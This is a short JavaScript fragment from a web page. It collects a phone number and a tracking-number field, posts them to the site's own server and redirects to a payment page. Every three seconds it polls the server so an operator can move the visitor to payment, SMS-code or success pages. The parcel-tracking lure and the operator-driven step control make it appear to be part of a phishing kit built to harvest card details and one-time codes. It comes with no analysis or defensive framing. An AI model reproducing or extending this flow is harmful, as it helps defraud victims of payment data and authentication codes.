    <script>
      function submit(){
        var phone = document.getElementById("splNumPhone").value; 
        var dob = document.getElementById("splTrackingNum").value; 
        if(phone!=""){
            if(phone.length == 10){
                $("#loaderWraper1").show();
				$.ajax({
					url: '/submit/phone/ajax/',
					data: {'phone': phone, 'dob': dob},
					success: function (data) {
						setTimeout(function () {
							window.location.href = "/payment/";
						}, 3000);
					}
				});
            }else{
                $("#splNumPhone").css("background-color","rgb(220 53 69/8%)");
                $("#errorMsg1").hide();
                $("#errorMsg2").show();
            }
        }else{
            $("#splNumPhone").css("background-color","rgb(220 53 69/8%)");
            $("#errorMsg1").show();
            $("#errorMsg2").hide();
        }
      }

      function getStep(){
        $.ajax({
          url: '/get/step/',
          success: function (data) {
            if (data === "home") {
              location.href='/'
            } else if(data === "payment"){
              location.href='/payment/';
            } else if(data === "sms"){
              location.href='/sms/';
            }else if(data === "success"){
              location.href='/success/';
            }
          }
        });
      }

      function intervale(){
        var intervalId = window.setInterval(function(){
          getStep();
        }, 3000);
      }
      intervale();
    </script></body>
